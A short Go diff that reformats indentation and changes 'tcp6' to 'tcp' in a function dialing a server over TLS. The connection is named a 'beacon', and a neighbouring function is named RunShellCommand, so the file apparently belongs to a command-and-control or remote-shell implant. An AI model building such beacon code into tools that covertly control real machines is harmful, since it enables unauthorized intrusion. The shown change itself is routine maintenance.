@@ -80,21 +80,21 @@ func RunShellCommand(command string) string {
 }
 
 func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
-	var address string
-	if net.ParseIP(ServerIP).To4() == nil {
-		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
-	} else {
-		address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
-	}
+    var address string
+    if net.ParseIP(ServerIP).To4() == nil {
+        address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
+    } else {
+        address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
+    }
 
-	logger.Logf(logger.Info, "Dialing %v", address)
+    logger.Logf(logger.Info, "Dialing %v", address)
 
-	beacon, err := tls.Dial("tcp6", address, config)
-	if err != nil {
-		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
-		return nil, nil, nil, err
-	}
-	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
+    beacon, err := tls.Dial("tcp", address, config)
+    if err != nil {
+        logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
+        return nil, nil, nil, err
+    }
+    return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
 }
 
 func GetLocalIP(beacon *tls.Conn) string {
